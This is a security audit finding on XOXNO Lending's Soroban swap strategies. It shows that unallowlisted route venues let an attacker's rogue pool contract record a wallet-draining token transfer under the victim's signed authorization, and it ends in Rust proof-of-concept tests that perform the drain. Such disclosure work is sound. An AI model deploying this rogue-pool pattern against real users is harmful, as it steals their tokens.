### Title
Unvalidated swap-route venues can invoke arbitrary contracts that ride the caller's signed auth tree and drain wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The Unibot exploit class is "unvalidated user input reaching an arbitrary call that spends the victim's tokens." XOXNO Lending's strategy entrypoints (`multiply`, `swap_debt`, `swap_collateral`, `repay_debt_with_collateral`) forward caller-supplied `swap` bytes to the swap aggregator, which calls whatever pool/token addresses the payload names with no allowlist. A route can therefore place an attacker-deployed "pool" on the call stack below the victim's `require_auth`, and any `token.transfer(victim, attacker, amount)` that contract performs is recorded as a child of the victim's authorization entry and executes once the victim signs the simulated tree — draining tokens far beyond the routed amount.

### Finding Description
`swap_collateral` calls `require_authorized_caller` and then `withdraw_and_swap_from_supply` with the raw `swap` bytes [1](#0-0) . `swap_tokens` passes those bytes verbatim to `router.execute_strategy` [2](#0-1) . The router resolves hop venue addresses from the payload and invokes them via `invoke_contract`/`dispatch_hop`; per the payload spec "The router calls the pool and token addresses its payload names and keeps no allowlist of them" [3](#0-2) . Because Soroban records sub-invocations under the caller's `require_auth` entry, a malicious venue contract calling `token::Client::transfer(&victim, &attacker, &amount)` attaches to the victim's signed tree. The dedicated harness test proves this end-to-end: `RogueHopPool::swap` transfers the victim's entire wallet balance, simulation records the theft as a sub-invocation of `swap_collateral`, and the signed tree executes it [4](#0-3) .

### Impact Explanation
Theft of user funds. The stolen amount is the victim's whole wallet balance of any token the rogue contract chooses — unbounded by the routed `amount_in`, the payload `min_out`, or the controller's post-swap risk gates, exactly like the Unibot `transferFrom` drain where approved/user-authorized flow exceeded the intended spend [5](#0-4) .

### Likelihood Explanation
Requires the victim to submit/sign a route that includes the attacker's contract — e.g., via a compromised or malicious quote path, phishing route bytes, or a direct `execute_strategy`/strategy call crafted by the attacker and signed by an inattentive user (simulation produces the poisoned tree automatically). Medium likelihood: same trust assumption that failed in Unibot/Maestro; mitigated only by client-side route decoding, which is an off-chain control [6](#0-5) .

### Recommendation
Constrain venue reachability on-chain: maintain a governance-controlled allowlist of pool/venue contracts the router may invoke, or restrict hop targets to addresses registered for known venue types. At minimum, have the controller/router reject payloads whose venue set includes addresses not present in a verified registry, so no user signature can ever authorize a sub-invocation tree containing unexpected token transfers.

### Proof of Concept
An attacker deploys `RogueHopPool` (constructor stores `(victim, wallet_token, attacker, amount)`; `swap()` calls `token::Client::transfer(&victim, &attacker, &amount)`) [7](#0-6) . They get the victim to sign `swap_collateral(account_id, current, from_amount, new, swap)` where `swap` decodes to a route whose hop pool is the rogue contract and whose `token_out` leg still pays a fair output. Simulation records `transfer(victim → attacker)` under the victim's `swap_collateral` auth entry; the signed transaction executes the theft while the collateral swap itself completes normally and passes all final risk gates [8](#0-7) .

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
